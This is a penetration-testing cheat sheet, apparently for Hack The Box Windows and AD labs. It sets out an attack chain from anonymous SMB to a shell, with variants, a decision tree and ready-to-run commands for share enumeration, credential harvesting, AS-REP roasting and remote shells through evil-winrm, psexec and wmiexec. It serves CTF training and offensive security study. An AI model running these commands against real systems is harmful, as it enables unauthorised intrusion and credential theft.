# Attack Pattern — Anonymous SMB to Shell

> A near-universal pattern on HTB Windows / AD boxes. Anonymous SMB
> exposes a share or null session, which leaks a credential, which
> grants WinRM / RDP / SMB shell.

## Signature

```
nmap → 445 open
  → smbmap -H or rpcclient -U "" -N → readable share / userlist
       → file mining or RPC enum → cred (cleartext or NTLM hash)
            → evil-winrm / psexec / wmiexec → shell
```

## Variants

### Variant A — `Replication` / SYSVOL → GPP cpassword
- Indicator: `Replication`, `SYSVOL`, or `Policies` share readable.
- Decode: `gpp-decrypt <cpassword>`.
- Real example: **Active**.

### Variant B — file dump → config / kdbx / bak with cred
- Indicator: random readable share with developer artefacts.
- Mining: `grep -RinE "(pass|key|secret|connection)" .`
- Real example: **Cascade** (`Audit$` → CascAudit.exe + Audit.db).

### Variant C — RPC null session → user list + AS-REP candidate
- Indicator: `rpcclient -U "" -N` `enumdomusers` returns users.
- Follow-on: AS-REPRoast → crack → cred.
- Real example: **Forest**.

### Variant D — SMB anon empty, but Kerberos open
- Indicator: SMB locked down; port 88 open.
- Pivot: web-scrape names → kerbrute → AS-REP.
- Real example: **Sauna**.

### Variant E — backup VHD / VHDX in share
- Indicator: large `.vhd` or `.vhdx` files.
- Action: `7z l file.vhdx` → mount via `guestmount` → SAM.
- Real example: **Bastion**.

## Decision-tree

```
nmap → 445 open
  ├─ smbmap returns shares (anon)
  │    ├─ Replication / SYSVOL → grep cpassword → decrypt
  │    ├─ Backups / VHD share → mount → SAM hashes
  │    └─ Generic share → recurse mget → grep creds
  │
  ├─ smbmap empty but rpcclient null works
  │    ├─ enumdomusers → users.txt
  │    │    └─ AS-REPRoast users → hashcat → cred
  │    └─ querydispinfo → descriptions sometimes contain cleartext
  │
  └─ both blocked
       └─ kerbrute userenum (via web-scraped users)
       └─ port-specific exploit (e.g., EternalBlue if applicable)
```

## Reusable commands

```bash
# anonymous SMB sweep
smbmap -H <ip>
smbmap -H <ip> -u guest -p ''
smbclient -L //<ip>/ -N
crackmapexec smb <ip> -u '' -p '' --shares
rpcclient -U "" -N <ip> -c "srvinfo;enumdomusers;querydispinfo;getdompwinfo;enumdomgroups"
enum4linux-ng -A <ip>

# share download
smbclient //<ip>/<share> -N -c 'recurse ON; prompt OFF; mget *'

# cred hunting in dumped files
grep -RinE "(pass|pwd|secret|key|cpassword|connection)" . | head -30
find . -iname "Groups.xml" -o -iname "Unattend.xml" -o -iname "*.kdbx" -o -iname "*.bak"

# cred validation
crackmapexec smb <ip> -u <u> -p '<p>'                   # → Pwn3d! means admin
crackmapexec winrm <ip> -u <u> -p '<p>'                 # → Pwn3d! means evil-winrm welcome

# shell
evil-winrm -i <ip> -u <u> -p '<p>'
impacket-psexec <dom>/<u>:<p>@<ip>
impacket-wmiexec <dom>/<u>:<p>@<ip>
```

## Why this works

Real organisations leave SMB shares open with legacy access for
backwards-compatibility. Modern hardening rarely makes it back to
older AD environments. CTF authors mirror this with deliberately-
permissive `Replication` shares (recreating an MS14-025 era leak).

## Real HTB Examples

- **Forest** — variant C
- **Active** — variant A
- **Cascade** — variant B
- **Bastion** — variant E
- **Resolute** — variant D analogue (RPC null + description leak)
- **Sauna** — variant D
- **Mantis** — variant D + MS14-068
- **Multimaster** — variant D + secondary chain

## Related

- [`smb/anonymous-share-enumeration.md`](../smb/anonymous-share-enumeration.md)
- [`active-directory/anonymous-ad-enumeration.md`](../active-directory/anonymous-ad-enumeration.md)
- [`active-directory/gpp-cpassword.md`](../active-directory/gpp-cpassword.md)
- [`active-directory/as-rep-roasting.md`](../active-directory/as-rep-roasting.md)
- [`methodology/02-enumeration-first.md`](../methodology/02-enumeration-first.md)
